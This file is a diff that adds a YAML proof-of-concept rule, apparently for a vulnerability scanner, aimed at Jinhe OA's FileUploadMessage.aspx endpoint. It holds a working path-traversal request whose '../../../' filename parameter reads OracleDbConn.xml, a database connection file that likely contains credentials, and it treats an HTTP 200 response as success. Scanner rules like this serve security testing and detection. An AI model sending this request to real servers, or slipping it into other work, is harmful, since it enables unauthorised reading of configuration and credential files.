@@ -1,0 +1,13 @@
+name: poc-yaml-jinheOA-FileUploadMessage-file-read
+rules:
+  - method: GET
+    path: /C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml
+    follow_redirects: false
+    expression: |
+      response.status == 200
+detail:
+    info: |
+       漏洞链接：http://127.0.0.1/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml
+    author: test
+    links:
+        - https://mp.weixin.qq.com/s/megMMQbSNROluqA78gIXrQ
